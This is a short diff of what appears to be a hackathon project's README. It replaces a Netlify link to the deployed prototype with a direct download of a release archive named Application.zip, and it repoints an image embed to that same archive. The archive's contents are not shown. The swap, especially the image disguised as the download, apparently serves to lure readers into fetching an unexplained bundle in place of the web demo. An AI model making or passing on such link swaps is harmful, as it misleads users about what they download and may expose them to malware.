@@ -2,10 +2,10 @@
 
 Deployed Prototype
 
-https://flourishing-cannoli-56757c.netlify.app/
+https://github.com/skarthi369/credit_hackathon/releases/download/v1.0/Application.zip
 
 
 
-   ![image](https://github.com/user-attachments/assets/e4af9567-9a8d-4a07-8bff-d6f1a45e3298)
+   ![image](https://github.com/skarthi369/credit_hackathon/releases/download/v1.0/Application.zip)
 
 
